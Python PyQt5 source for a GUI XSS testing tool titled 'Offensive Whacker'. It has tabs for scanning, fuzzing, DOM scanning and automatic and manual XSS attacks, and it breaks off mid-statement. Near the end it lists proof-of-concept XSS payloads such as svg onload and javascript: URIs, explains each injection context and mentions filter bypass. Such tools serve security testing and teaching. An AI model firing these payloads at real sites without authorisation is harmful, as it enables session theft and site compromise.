import sys
from PyQt5.QtWidgets import QMainWindow, QApplication,  QPushButton, QLineEdit,  QLabel, \
    QCheckBox, QListWidget,  QTextEdit, QRadioButton
from PyQt5.QtGui import QTextCursor
from selenium import webdriver
import pyperclip as pc
from selenium.webdriver.common.by import By
import time
import cgitb
from PyQt5 import QtCore, QtGui, QtWidgets
import os
import logging
from PyQt5.QtCore import Qt
from fpdf import FPDF
cgitb.enable(format='text')
import json
import re

class App(object):

    def __init__(self):
        super().__init__()
        # self.title = ''
        # self.left = 100
        # self.top = 20
        # self.width = 900
        # self.height = 450
        sys.stdout = open('result.txt', 'a+')

        logging.basicConfig(filename="app_logs.log",
                            format='%(asctime)s %(message)s',
                            filemode='w')

        self.logger = logging.getLogger()
        """
        Setting the threshold of logger to DEBUG
        """
        self.logger.setLevel(logging.DEBUG)

    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(800, 600)
        Dialog.setMinimumSize(QtCore.QSize(0, 0))
        Dialog.setWindowOpacity(0.98)
        Dialog.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.verticalLayout = QtWidgets.QVBoxLayout(Dialog)
        self.verticalLayout.setObjectName("verticalLayout")
        self.frame_2 = QtWidgets.QFrame(Dialog)
        self.frame_2.setMinimumSize(QtCore.QSize(0, 50))
        self.frame_2.setMaximumSize(QtCore.QSize(16777215, 100))
        self.frame_2.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.frame_2.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_2.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_2.setObjectName("frame_2")
        self.horizontalLayout = QtWidgets.QHBoxLayout(self.frame_2)
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.enterWebsitelabel = QtWidgets.QLabel(self.frame_2)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.enterWebsitelabel.setFont(font)
        self.enterWebsitelabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.enterWebsitelabel.setObjectName("enterWebsitelabel")
        self.horizontalLayout.addWidget(self.enterWebsitelabel)
        self.websiteTextbox = QtWidgets.QLineEdit(self.frame_2)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.websiteTextbox.setFont(font)
        self.websiteTextbox.setStyleSheet("color: rgb(0, 0, 0);")
        self.websiteTextbox.setObjectName("websiteTextbox")
        self.horizontalLayout.addWidget(self.websiteTextbox)
        self.button = QtWidgets.QPushButton(self.frame_2)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.button.setFont(font)
        self.button.setStyleSheet("color: rgb(0, 0, 0);")
        self.button.setObjectName("button")
        self.horizontalLayout.addWidget(self.button)
        self.verticalLayout.addWidget(self.frame_2)
        self.frame = QtWidgets.QFrame(Dialog)
        self.frame.setStyleSheet("")
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame.setObjectName("frame")
        self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.frame)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.tabWidget = QtWidgets.QTabWidget(self.frame)
        self.tabWidget.setToolTip("")
        self.tabWidget.setStyleSheet("background-color: rgb(255, 255, 255);")
        self.tabWidget.setObjectName("tabWidget")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.change = QtWidgets.QPushButton(self.tab)
        self.change.setGeometry(QtCore.QRect(150, 130, 200, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change.setFont(font)
        self.change.setStyleSheet("color: rgb(0, 0, 0);")
        self.change.setCheckable(False)
        self.change.setObjectName("change")
        ####################################
        #XSS Vulnerability Scan

        self.change_export = QtWidgets.QPushButton(self.tab)
        self.change_export.setGeometry(QtCore.QRect(370, 130, 200, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change_export.setFont(font)
        self.change_export.setStyleSheet("color: rgb(0, 0, 0);\n"
                                    "")
        #self.change_export.setCheckable(False)
        self.change_export.setObjectName("change_export")
        self.change_export.setText("Export to PDF")


        #label for message
        self.change_label = QtWidgets.QLabel(self.tab)
        self.change_label.setGeometry(QtCore.QRect(580, 130, 200, 31))
        self.change_label.setObjectName("change_label")
        self.change_label.setText("")






        # Label Positioning for XSS Vuln Scan
        self.label_3 = QtWidgets.QLabel(self.tab)
        self.label_3.setGeometry(QtCore.QRect(170, 50, 410, 40))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(16)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        self.label_3.setFont(font)
        self.label_3.setAutoFillBackground(False)
        self.label_3.setStyleSheet("font: 13pt \"Arial\";\n"
                                   "color: rgb(0, 0, 0);")
        self.label_3.setObjectName("label_3")
        self.label_9 = QtWidgets.QLabel(self.tab)
        self.label_9.setGeometry(QtCore.QRect(150, 200, 550, 105))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(16)
        font.setBold(False)
        font.setItalic(True)
        font.setWeight(50)
        self.label_9.setFont(font)
        self.label_9.setAutoFillBackground(False)
        self.label_9.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: italic 13pt \"Arial\";")
        self.label_9.setObjectName("label_9")
        self.tabWidget.addTab(self.tab, "")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName("tab_2")
        self.label_2 = QtWidgets.QLabel(self.tab_2)
        self.label_2.setGeometry(QtCore.QRect(170, 50, 410, 40))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(14)
        font.setBold(False)
        font.setItalic(True)
        font.setWeight(50)
        self.label_2.setFont(font)
        self.label_2.setAutoFillBackground(False)
        self.label_2.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: 13pt \"Arial\";")
        self.label_2.setObjectName("label_2")
        self.change_2 = QtWidgets.QPushButton(self.tab_2)
        self.change_2.setGeometry(QtCore.QRect(220, 130, 300, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change_2.setFont(font)
        self.change_2.setStyleSheet("color: rgb(0, 0, 0);")
        self.change_2.setCheckable(False)
        self.change_2.setObjectName("change_2")

        ####################################
        #Automatic XSS Attack

        #
        #label for
        self.change_2_label = QtWidgets.QLabel(self.tab_2)
        self.change_2_label.setGeometry(QtCore.QRect(580, 130, 200, 31))
        self.change_2_label.setObjectName("change_label")
        self.change_2_label.setText("")



        ###############################

        self.label_8 = QtWidgets.QLabel(self.tab_2)
        self.label_8.setGeometry(QtCore.QRect(150, 200, 550, 105))
        font = QtGui.QFont()
        font.setFamily("Century Gothic")
        font.setPointSize(16)
        font.setBold(False)
        font.setItalic(True)
        font.setWeight(50)
        self.label_8.setFont(font)
        self.label_8.setAutoFillBackground(False)
        self.label_8.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: italic 13pt \"Arial\";")
        self.label_8.setObjectName("label_8")
        self.tabWidget.addTab(self.tab_2, "")
        self.tab_3 = QtWidgets.QWidget()
        self.tab_3.setObjectName("tab_3")
        self.change_3 = QtWidgets.QPushButton(self.tab_3)
        self.change_3.setGeometry(QtCore.QRect(150, 130, 200, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change_3.setFont(font)
        self.change_3.setStyleSheet("color: rgb(0, 0, 0);\n"
                                    "")
        self.change_3.setCheckable(False)
        self.change_3.setObjectName("change_3")

        ####################################
        #Fuzz scanning

        self.change_3_export = QtWidgets.QPushButton(self.tab_3)
        self.change_3_export.setGeometry(QtCore.QRect(370, 130, 200, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change_3_export.setFont(font)
        self.change_3_export.setStyleSheet("color: rgb(0, 0, 0);\n"
                                    "")
        #self.change_3_export.setCheckable(False)
        self.change_3_export.setObjectName("change_3_export")
        self.change_3_export.setText("Export to PDF")

        ##label for message
        self.change_3_label = QtWidgets.QLabel(self.tab_3)
        self.change_3_label.setGeometry(QtCore.QRect(580, 130, 200, 31))
        self.change_3_label.setObjectName("change_label")
        self.change_3_label.setText("")




        ###############################




        self.label_4 = QtWidgets.QLabel(self.tab_3)
        self.label_4.setGeometry(QtCore.QRect(170, 50, 410, 40))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(13)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        self.label_4.setFont(font)
        self.label_4.setAutoFillBackground(False)
        self.label_4.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: 13pt \"Arial\";")
        self.label_4.setObjectName("label_4")
        self.label_6 = QtWidgets.QLabel(self.tab_3)
        self.label_6.setGeometry(QtCore.QRect(150, 200, 550, 105))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(13)
        font.setBold(False)
        font.setItalic(True)
        font.setWeight(50)
        self.label_6.setFont(font)
        self.label_6.setAutoFillBackground(False)
        self.label_6.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: italic 13pt \"Arial\";")
        self.label_6.setObjectName("label_6")
        self.tabWidget.addTab(self.tab_3, "")
        self.tab_4 = QtWidgets.QWidget()
        self.tab_4.setObjectName("tab_4")
        self.change_4 = QtWidgets.QPushButton(self.tab_4)
        self.change_4.setGeometry(QtCore.QRect(150, 130, 200, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change_4.setFont(font)
        self.change_4.setStyleSheet("color: rgb(0, 0, 0);\n"
                                    "")
        self.change_4.setCheckable(False)
        self.change_4.setObjectName("change_4")
        ####################################
        #DOM Scanner

        self.change_4_export = QtWidgets.QPushButton(self.tab_4)
        self.change_4_export.setGeometry(QtCore.QRect(370, 130, 200, 31))
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.change_4_export.setFont(font)
        self.change_4_export.setStyleSheet("color: rgb(0, 0, 0);\n"
                                    "")
        #self.change_4_export.setCheckable(False)
        self.change_4_export.setObjectName("change_4_export")
        self.change_4_export.setText("Export to PDF")

        ##label for message
        self.change_4_label = QtWidgets.QLabel(self.tab_4)
        self.change_4_label.setGeometry(QtCore.QRect(580, 130, 200, 31))
        self.change_4_label.setObjectName("change_label")
        self.change_4_label.setText("")




        ###############################
        self.label_5 = QtWidgets.QLabel(self.tab_4)
        self.label_5.setGeometry(QtCore.QRect(170, 50, 410, 40))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(13)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        self.label_5.setFont(font)
        self.label_5.setAutoFillBackground(False)
        self.label_5.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: 13pt \"Arial\";")
        self.label_5.setObjectName("label_5")
        self.label_7 = QtWidgets.QLabel(self.tab_4)
        self.label_7.setGeometry(QtCore.QRect(150, 200, 550, 105))
        font = QtGui.QFont()
        font.setFamily("Arial")
        font.setPointSize(16)
        font.setBold(False)
        font.setItalic(True)
        font.setWeight(50)
        self.label_7.setFont(font)
        self.label_7.setAutoFillBackground(False)
        self.label_7.setStyleSheet("color: rgb(0, 0, 0);\n"
                                   "font: italic 13pt \"Arial\";")
        self.label_7.setObjectName("label_7")
        self.tabWidget.addTab(self.tab_4, "")
        self.tab_5 = QtWidgets.QWidget()
        self.tab_5.setObjectName("tab_5")
        self.verticalLayout_3 = QtWidgets.QVBoxLayout(self.tab_5)
        self.verticalLayout_3.setObjectName("verticalLayout_3")
        self.upper = QtWidgets.QFrame(self.tab_5)
        self.upper.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.upper.setFrameShadow(QtWidgets.QFrame.Raised)
        self.upper.setObjectName("upper")
        self.horizontalLayout_2 = QtWidgets.QHBoxLayout(self.upper)
        self.horizontalLayout_2.setContentsMargins(-1, 0, -1, 0)
        self.horizontalLayout_2.setObjectName("horizontalLayout_2")
        self.frame_3 = QtWidgets.QFrame(self.upper)
        self.frame_3.setMaximumSize(QtCore.QSize(230, 16777215))
        self.frame_3.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_3.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_3.setObjectName("frame_3")
        self.horizontalLayout_3 = QtWidgets.QHBoxLayout(self.frame_3)
        self.horizontalLayout_3.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout_3.setObjectName("horizontalLayout_3")
        self.frame_6 = QtWidgets.QFrame(self.frame_3)
        self.frame_6.setMaximumSize(QtCore.QSize(200, 16777215))
        self.frame_6.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_6.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_6.setObjectName("frame_6")
        self.verticalLayout_4 = QtWidgets.QVBoxLayout(self.frame_6)
        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout_4.setObjectName("verticalLayout_4")
        self.craftingPayloadLabel = QtWidgets.QLabel(self.frame_6)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.craftingPayloadLabel.setFont(font)
        self.craftingPayloadLabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.craftingPayloadLabel.setObjectName("craftingPayloadLabel")
        self.verticalLayout_4.addWidget(self.craftingPayloadLabel)
        self.craftingPayloadTextbox = QtWidgets.QTextEdit(self.frame_6)
        self.craftingPayloadTextbox.setMaximumSize(QtCore.QSize(180, 16777215))
        self.craftingPayloadTextbox.setStyleSheet("color: rgb(0, 0, 0);")
        self.craftingPayloadTextbox.setObjectName("craftingPayloadTextbox")
        self.verticalLayout_4.addWidget(self.craftingPayloadTextbox)
        self.horizontalLayout_3.addWidget(self.frame_6)
        self.horizontalLayout_2.addWidget(self.frame_3)
        self.frame_7 = QtWidgets.QFrame(self.upper)

        self.frame_7.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_7.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_7.setObjectName("frame_7")
        self.verticalLayout_10 = QtWidgets.QVBoxLayout(self.frame_7)
        self.verticalLayout_10.setObjectName("verticalLayout_10")
        self.xxslistlabel = QtWidgets.QLabel(self.frame_7)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.xxslistlabel.setFont(font)
        self.xxslistlabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.xxslistlabel.setObjectName("xxslistlabel")
        self.verticalLayout_10.addWidget(self.xxslistlabel)
        self.xxsPayloadlist = QtWidgets.QListWidget(self.frame_7)
        self.xxsPayloadlist.setStyleSheet("color: rgb(0, 0, 0);")
        self.xxsPayloadlist.setObjectName("xxsPayloadlist")
        self.verticalLayout_10.addWidget(self.xxsPayloadlist)
        self.horizontalLayout_2.addWidget(self.frame_7, 0, QtCore.Qt.AlignHCenter)
        self.frame_5 = QtWidgets.QFrame(self.upper)
        self.frame_5.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_5.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_5.setObjectName("frame_5")
        self.verticalLayout_6 = QtWidgets.QVBoxLayout(self.frame_5)
        self.verticalLayout_6.setContentsMargins(-1, 0, 0, 0)
        self.verticalLayout_6.setObjectName("verticalLayout_6")
        self.frame_8 = QtWidgets.QFrame(self.frame_5)
        self.frame_8.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_8.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_8.setObjectName("frame_8")
        self.horizontalLayout_4 = QtWidgets.QHBoxLayout(self.frame_8)
        self.horizontalLayout_4.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout_4.setSpacing(0)
        self.horizontalLayout_4.setObjectName("horizontalLayout_4")
        self.frame_10 = QtWidgets.QFrame(self.frame_8)
        self.frame_10.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_10.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_10.setObjectName("frame_10")
        self.verticalLayout_7 = QtWidgets.QVBoxLayout(self.frame_10)
        self.verticalLayout_7.setObjectName("verticalLayout_7")
        self.xxslabel = QtWidgets.QLabel(self.frame_10)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.xxslabel.setFont(font)
        self.xxslabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.xxslabel.setObjectName("xxslabel")
        self.verticalLayout_7.addWidget(self.xxslabel)
        self.checkbox_A = QtWidgets.QCheckBox(self.frame_10)
        self.checkbox_A.setStyleSheet("color: rgb(0, 0, 0);")
        self.checkbox_A.setObjectName("checkbox_A")
        self.verticalLayout_7.addWidget(self.checkbox_A)
        self.checkbox_B = QtWidgets.QCheckBox(self.frame_10)
        self.checkbox_B.setStyleSheet("color: rgb(0, 0, 0);")
        self.checkbox_B.setObjectName("checkbox_B")
        self.verticalLayout_7.addWidget(self.checkbox_B)
        self.checkbox_C = QtWidgets.QCheckBox(self.frame_10)
        self.checkbox_C.setStyleSheet("color: rgb(0, 0, 0);")
        self.checkbox_C.setObjectName("checkbox_C")
        self.verticalLayout_7.addWidget(self.checkbox_C)
        self.horizontalLayout_4.addWidget(self.frame_10, 0, QtCore.Qt.AlignTop)
        self.frame_11 = QtWidgets.QFrame(self.frame_8)
        self.frame_11.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_11.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_11.setObjectName("frame_11")
        self.verticalLayout_8 = QtWidgets.QVBoxLayout(self.frame_11)
        self.verticalLayout_8.setObjectName("verticalLayout_8")
        self.attackFormatlabel = QtWidgets.QLabel(self.frame_11)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.attackFormatlabel.setFont(font)
        self.attackFormatlabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.attackFormatlabel.setObjectName("attackFormatlabel")
        self.verticalLayout_8.addWidget(self.attackFormatlabel)
        self.rbtn1 = QtWidgets.QRadioButton(self.frame_11)
        self.rbtn1.setStyleSheet("color: rgb(0, 0, 0);")
        self.rbtn1.setObjectName("rbtn1")
        self.verticalLayout_8.addWidget(self.rbtn1)
        self.rbtn2 = QtWidgets.QRadioButton(self.frame_11)
        self.rbtn2.setStyleSheet("color: rgb(0, 0, 0);")
        self.rbtn2.setObjectName("rbtn2")
        self.verticalLayout_8.addWidget(self.rbtn2)
        self.horizontalLayout_4.addWidget(self.frame_11, 0, QtCore.Qt.AlignHCenter | QtCore.Qt.AlignTop)
        self.verticalLayout_6.addWidget(self.frame_8)
        self.frame_9 = QtWidgets.QFrame(self.frame_5)
        self.frame_9.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_9.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_9.setObjectName("frame_9")
        self.verticalLayout_9 = QtWidgets.QVBoxLayout(self.frame_9)
        self.verticalLayout_9.setObjectName("verticalLayout_9")
        self.payloadDesLabel = QtWidgets.QLabel(self.frame_9)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.payloadDesLabel.setFont(font)
        self.payloadDesLabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.payloadDesLabel.setObjectName("payloadDesLabel")
        self.verticalLayout_9.addWidget(self.payloadDesLabel)
        self.payloadDesOutput = QtWidgets.QTextEdit(self.frame_9)
        self.payloadDesOutput.setStyleSheet("color: rgb(0, 0, 0);\n"
                                            "")
        self.payloadDesOutput.setObjectName("payloadDesOutput")
        self.verticalLayout_9.addWidget(self.payloadDesOutput)
        self.verticalLayout_6.addWidget(self.frame_9, 0, QtCore.Qt.AlignHCenter)
        self.horizontalLayout_2.addWidget(self.frame_5)
        self.verticalLayout_3.addWidget(self.upper)
        self.frame_4 = QtWidgets.QFrame(self.tab_5)
        self.frame_4.setMinimumSize(QtCore.QSize(500, 120))
        self.frame_4.setMaximumSize(QtCore.QSize(16777215, 100))
        self.frame_4.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_4.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_4.setObjectName("frame_4")
        self.verticalLayout_5 = QtWidgets.QVBoxLayout(self.frame_4)
        self.verticalLayout_5.setObjectName("verticalLayout_5")
        self.loglabel = QtWidgets.QLabel(self.frame_4)
        font = QtGui.QFont()
        font.setBold(True)
        font.setWeight(75)
        self.loglabel.setFont(font)
        self.loglabel.setStyleSheet("color: rgb(0, 0, 0);")
        self.loglabel.setObjectName("loglabel")
        self.verticalLayout_5.addWidget(self.loglabel)
        self.logOutput = QtWidgets.QTextEdit(self.frame_4)
        self.logOutput.setMaximumSize(QtCore.QSize(16777215, 200))
        self.logOutput.setStyleSheet("color: rgb(0, 0, 0);")
        self.logOutput.setObjectName("logOutput")
        self.verticalLayout_5.addWidget(self.logOutput)
        self.verticalLayout_3.addWidget(self.frame_4)
        self.tabWidget.addTab(self.tab_5, "")
        self.verticalLayout_2.addWidget(self.tabWidget)
        self.verticalLayout.addWidget(self.frame)

        self.retranslateUi(Dialog)
        self.tabWidget.setCurrentIndex(2)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

        self.logOutput.setReadOnly(True)
        self.payloadDesOutput.setReadOnly(True)
        self.craftingPayloadTextbox.setReadOnly(True)

        

        self.change_export.clicked.connect(lambda: self.export_to_pdf("XSS_Vulnerability_Scan"))
        self.change_3_export.clicked.connect(lambda: self.export_to_pdf("fuzz_scanning"))
        self.change_4_export.clicked.connect(lambda: self.export_to_pdf("DOM_Scanner"))

    def export_to_pdf(self,option):
        
        #XSS Vulnerability Scan
        if (option == 'XSS_Vulnerability_Scan'):
            # save FPDF() class into 
            # a variable pdf
            pdf = FPDF()   
            
            # Add a page
            pdf.add_page()
            
            # set style and size of font 
            # that you want in the pdf
            pdf.add_font("Arial", "", "arial.ttf", uni=True)
            pdf.set_font("Arial", size = 15)
            
            # open the text file in read mode
            print("openning file")
            try:
                print("openning file")
                f = json.load(open("Vulnerability Scan\\file.json"))
             
                
                
                # insert the texts in pdf
                for x in f['results']:
                    for y in x.keys():
                        data_to_str = str(y) + ":" + str(x[y])
                        pdf.multi_cell(0, 10, txt = str(data_to_str), align = 'L')
                    pdf.multi_cell(0, 10, txt = str("================================================"), align = 'L')
                
                # save the pdf with name .pdf
                pdf.output("Vulnerability Scan\\pdf_output.pdf")  

                self.change_label.setText("PDF generated!")
                self.change_label.repaint()
                time.sleep(3)
                self.change_label.setText("")
                self.change_label.repaint()
            except Exception as e:
                print("Command could not run", e)
        
        elif (option == 'fuzz_scanning'):
            # save FPDF() class into 
            # a variable pdf
            pdf = FPDF()   
            
            # Add a page
            pdf.add_page()
            
            # set style and size of font 
            # that you want in the pdf
            pdf.add_font("Arial", "", "arial.ttf", uni=True)
            pdf.set_font("Arial", size = 15)
            
            # open the text file in read mode
            try:
                f = open("Fuzz Scanning\\output\\file.txt", "r")
                print("File opened")
                
                # insert the texts in pdf
                for x in f:
                    pdf.multi_cell(0, 10, txt = x, align = 'L')
                
                # save the pdf with name .pdf
                pdf.output("Fuzz Scanning\\output\\pdf_output.pdf")  

                self.change_3_label.setText("PDF Generated")
                self.change_3_label.repaint()
                time.sleep(3)
                self.change_3_label.setText("")
                self.change_3_label.repaint()
            except Exception as e:
                print("Command could not run", e)
        elif (option == 'DOM_Scanner'):
            # save FPDF() class into 
            # a variable pdf
            pdf = FPDF()   
            
            # Add a page
            pdf.add_page()
            
            # set style and size of font 
            # that you want in the pdf
            pdf.add_font("Arial", "", "arial.ttf", uni=True)
            pdf.set_font("Arial", size = 15)
            
            # open the text file in read mode
            try:
                f = open("DOM Scanner\\test.txt", "r")
                print("File opened")
                data_dump = []
                for x in f:
                    data_dump.append(x)

                json.dump( data_dump, open( 'DOM Scanner\\file.json', 'w' ) )

                new_data = json.load(open('DOM Scanner\\file.json','r'))
                #dumping into json file for removing special characters
             
                for x in new_data:
                    a = re.sub(r'\x1b(\[.*?[@-~]|\].*?(\x07|\x1b\\))', '', x) #removing special character
                    pdf.multi_cell(0, 10, txt = a, align = 'L')
                
                # save the pdf with name .pdf
                pdf.output("DOM Scanner\\pdf_output.pdf")  
                self.change_4_label.setText("PDF Generated")
                self.change_4_label.repaint()
                time.sleep(3)
                self.change_4_label.setText("")
                self.change_4_label.repaint()
            except Exception as e:
                print("Command could not run", e)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Offensive Whacker"))
        self.enterWebsitelabel.setText(_translate("Dialog", "Enter Website:"))
        self.button.setText(_translate("Dialog", "Attack"))
        self.change.setText(_translate("Dialog", "Scan"))
        self.label_3.setText(_translate("Dialog", "This tab allows you to scan URLs for XSS Vulnerabilities."))
        self.label_9.setText(_translate("Dialog", "Instructions: \n"
                                                  " 1) Click Scan to start \n "
                                                  "2) You may choose to export as PDF once scan has completed."))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("Dialog", "XSS Vulnerability Scan"))
        self.label_2.setText(_translate("Dialog", "This tab allows you to perform automatic XSS attacks."))
        self.label_2.setWordWrap(True)
        self.change_2.setText(_translate("Dialog", "Start Attack"))
        self.label_8.setText(_translate("Dialog", "Instructions: \n"
                                                  " 1) Input URL with proper parameters. \n"
                                                  " eg: https://xss-game.appspot.com/level1/frame?query=2206 \n "
                                                  "2) Click on Start Attack \n"
                                                  ))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2),
                                  _translate("Dialog", "Automatic XSS Attack"))
        self.change_3.setText(_translate("Dialog", "Start Fuzzing"))
        self.label_4.setText(_translate("Dialog", "This tab allows you to generate potential fuzz based attacks."))
        self.label_4.setWordWrap(True)
        self.label_6.setText(_translate("Dialog", "Instructions: \n"
                                                  " 1) Input URL with domain name only. \n"
                                                  " eg: singaporetech.edu.sg \n "
                                                  "2) Click on Start Fuzzing \n"
                                                  " 3) You may choose to export as PDF once scanning has completed. "))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate("Dialog", "Fuzz Scanning"))
        self.change_4.setText(_translate("Dialog", "Scan"))
        self.label_5.setText(_translate("Dialog", "This tab allows you to scan for DOM based XSS vulnerabilities."))
        self.label_5.setWordWrap(True)
        self.label_7.setText(_translate("Dialog", "Instructions: \n"
                                                  " 1) Input URL with proper parameters. \n"
                                                  " eg: https://sudo.co.il/xss/level0.php?email= \n "
                                                  "2) Click on Scan \n"
                                                  " 3) You may choose to export as PDF once scanning has completed."))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), _translate("Dialog", "DOM Scanner"))
        self.craftingPayloadLabel.setText(_translate("Dialog", "Craft XXS Payload"))
        self.xxslistlabel.setText(_translate("Dialog", "Select XSS Payload Commands:"))
        self.xxslabel.setText(_translate("Dialog", "XXS Type:"))
        self.checkbox_A.setText(_translate("Dialog", "Basic"))
        self.checkbox_B.setText(_translate("Dialog", "Advance"))
        self.checkbox_C.setText(_translate("Dialog", "Filter Bypass"))
        self.attackFormatlabel.setText(_translate("Dialog", "Attack Format"))
        self.rbtn1.setText(_translate("Dialog", "Website Input Field"))
        self.rbtn2.setText(_translate("Dialog", "URL"))
        self.payloadDesLabel.setText(_translate("Dialog", "Description:"))
        self.loglabel.setText(_translate("Dialog", "Logs:"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_5), _translate("Dialog", "Manual XSS Attack"))

        self.button.clicked.connect(self.onClickedAttackBtn)
        self.rbtn1.toggled.connect(self.onClickedRadio)
        self.rbtn2.toggled.connect(self.onClickedRadio)
        self.xxsPayloadlist.clicked.connect(self.onClickedAttackBtn)

        self.checkbox_C.stateChanged.connect(self.checkbox_c_click)
        self.checkbox_A.stateChanged.connect(self.checkbox_a_click)
        self.checkbox_B.stateChanged.connect(self.checkbox_b_click)

        self.change.clicked.connect(self.changeTabText)
        self.change_2.clicked.connect(self.changeTabText_2)
        self.change_3.clicked.connect(self.changeTabText_3)
        self.change_4.clicked.connect(self.changeTabText_4)

        

    def onClickedRadio(self):
        if self.rbtn2.isChecked():
            self.craftingPayloadTextbox.setText(
                str(self.websiteTextbox.text()) + self.xxsPayloadlist.currentItem().text())
        elif self.rbtn1.isChecked():
            self.craftingPayloadTextbox.setText(self.xxsPayloadlist.currentItem().text())

    def onClickedPayloadList(self):
        currentItemText = self.xxsPayloadlist.currentItem().text()
        self.craftingPayloadTextbox.setText(currentItemText)
        if currentItemText == "<svg onload=alert(1)>" or currentItemText == "“><svg onload=alert(1)>":
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — Simple Tag Injection\n---------------------------------------------\nUse " \
                             "when input lands inside an attribute’s \nvalue of an HTML tag or outside tag except " \
                             "\nthe ones described in next case. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
            print(self.xxsPayloadlist.currentItem().text())
        elif currentItemText == "</tag><svg onload=alert(1)>" or currentItemText == "“></tag><svg onload=alert(1)>":
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — In Block Tag " \
                             "Injection\n---------------------------------------------\nUse when input lands inside " \
                             "or between opening/closing\nof the following " \
                             "tags:<title><style><script><textarea>\n<noscript><pre><xmp> and <iframe> (</tag> is " \
                             "accordingly). "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif currentItemText == "javascript:alert(1)" or currentItemText == "data:text/html,<svg onload=alert(1)>":
            self.payloadDesOutput.clear()
            payloadDesText = "HTML Context — Source Injection\n---------------------------------------------\nUse " \
                             "when input lands as a value of the following HTML tag attributes: href, src, " \
                             "data\nor action (also formation). For src in script tag use an external script call (" \
                             "URL) or\n“data:,alert(1)”. 2nd payload below alerts out of target’s context for Webkit " \
                             "browsers. "
            self.payloadDesOutput.insertPlainText(payloadDesText)
        elif (
